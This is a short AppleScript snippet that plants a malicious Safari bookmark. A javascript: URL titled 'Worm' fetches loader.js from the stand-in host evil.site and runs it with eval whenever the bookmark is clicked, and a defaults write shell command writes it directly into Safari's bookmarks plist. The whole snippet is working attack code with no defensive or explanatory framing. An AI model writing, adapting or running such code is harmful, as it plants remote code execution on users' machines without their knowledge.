-- Add a bookmark that executes a JavaScript-based worm on click
set jsPayload to "javascript:fetch('http://evil.site/loader.js').then(r => r.text()).then(eval)"

-- Use shell to write directly to Safari's bookmarks plist (old format)
do shell script "defaults write com.apple.Safari Bookmarks '{Title = Worm; URLString = \"" & jsPayload & "\";}'"
